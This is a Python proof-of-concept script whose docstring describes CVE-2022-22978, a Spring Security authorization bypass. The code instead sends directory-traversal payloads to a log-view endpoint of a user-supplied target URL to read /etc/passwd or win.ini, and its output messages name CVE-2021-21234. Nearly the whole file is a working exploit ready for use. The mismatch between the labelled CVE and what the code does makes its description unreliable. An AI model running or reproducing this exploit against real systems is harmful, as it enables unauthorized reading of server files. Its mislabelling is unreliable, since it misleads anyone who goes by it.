import requests
from time import sleep
requests.packages.urllib3.disable_warnings()

'''
CVE-2022-22978: Spring Security Authorization Bypass in RegexRequestMatcher

In Spring Security versions 5.5.6 and 5.6.3 and older unsupported versions, RegexRequestMatcher can easily be misconfigured to be bypassed on some servlet containers.

Applications using RegexRequestMatcher with . in the regular expression are possibly vulnerable to an authorization bypass.

References:

https://tanzu.vmware.com/security/cve-2022-22978
https://github.com/DeEpinGh0st/CVE-2022-22978
'''


def poc(url, useragent, proxies=None):
    payload1 = '/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
    payload2 = '/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
    payload3 = '/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
    payload4 = '/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
    header = {"User-Agent": useragent}

    try:
        re1 = requests.post(url=url + payload1, headers=header, timeout=10, verify=False, proxies=proxies)
        sleep(0.5)
        re2 = requests.post(url=url + payload2, headers=header, timeout=10, verify=False, proxies=proxies)
        sleep(0.5)
        re3 = requests.post(url=url + payload3, headers=header, timeout=10, verify=False, proxies=proxies)
        sleep(0.5)
        re4 = requests.post(url=url + payload4, headers=header, timeout=10, verify=False, proxies=proxies)
        if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
            return f'[+] CVE-2021-21234 exists, the system is Win: --> {url + payload1}, {url + payload2}'
        elif (('root:x:' in str(re3.text)) or ('root:x:' in str(re4.text))):
            return f'[+] CVE-2021-21234 exists, the system is Linux: --> {url + payload3}, {url + payload4}'
        else:
           return '[-] CVE-2021-21234 not exists.'
    except Exception as e:
        return f'[-] An error occurred and it has been logged: {e}'

if __name__ == '__main__':
    print(poc(input('请输入目标url:').strip('/'), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'))
